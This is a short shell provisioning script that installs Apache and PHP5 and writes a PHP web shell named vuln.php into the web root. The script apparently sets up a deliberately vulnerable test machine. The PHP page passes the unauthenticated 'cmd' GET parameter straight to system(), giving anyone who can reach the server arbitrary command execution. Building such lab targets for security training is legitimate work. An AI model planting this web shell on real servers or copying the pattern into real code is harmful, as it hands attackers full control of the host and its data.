#!/bin/sh

echo "script start" >> /tmp/result

apt-get update -y
apt-get install apache2 -y
apt-get install -y php5

cat << EOF > /var/www/html/vuln.php
<html>
<body>
<form method="GET" name="<?php echo basename(\$_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset(\$_GET['cmd']))
    {
        system(\$_GET['cmd']);
    }
?>
</pre>
</body>
</html>

EOF
